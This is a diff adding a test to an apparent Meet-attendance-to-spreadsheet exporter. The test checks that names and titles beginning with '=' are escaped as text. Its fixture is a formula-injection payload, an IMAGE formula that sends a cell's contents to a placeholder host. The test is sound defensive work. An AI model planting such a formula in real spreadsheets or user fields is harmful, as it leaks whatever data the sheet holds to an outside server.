@@ -150,3 +150,20 @@ test('a person recorded twice by Meet is one person in the tabs people read', as
   assert.deepEqual(Object.keys(JSON.parse(backup).attendance), ['Jan K', 'Jan Kowalski'],
     'the backup keeps the record as it is stored, or restoring it could not take the merge back');
 });
+
+test('a name that would read as a formula goes into the sheet as text', async () => {
+  appends.clear();
+  // what somebody in the call chose to be called, which is not something to hand a spreadsheet
+  const hostile = '=IMAGE("http://example.invalid/"&A1)';
+  await appendRecords('a'.repeat(30), { meetings: [{
+    id: 'abc-defg-hij-4', meetingCode: 'abc-defg-hij', meetingTitle: '=1+1', url: '',
+    date: '2026-08-14T09:00:00.000Z', endedAt: '2026-08-14T10:00:00.000Z',
+    attendance: { [hostile]: { email: null, events: [{ time: '2026-08-14T09:00:00.000Z', type: 'Join' }] } }
+  }] });
+
+  assert.equal(appends.get('Meetings')[0][1], "'=1+1", 'the sheet is told to read the title, not to run it');
+  assert.equal(appends.get('Participants')[0][1], `'${hostile}`);
+
+  const backup = appends.get('Backup').map(r => r[3]).join('');
+  assert.equal(JSON.parse(backup).meetingTitle, '=1+1', 'and the backup still carries what was recorded');
+});
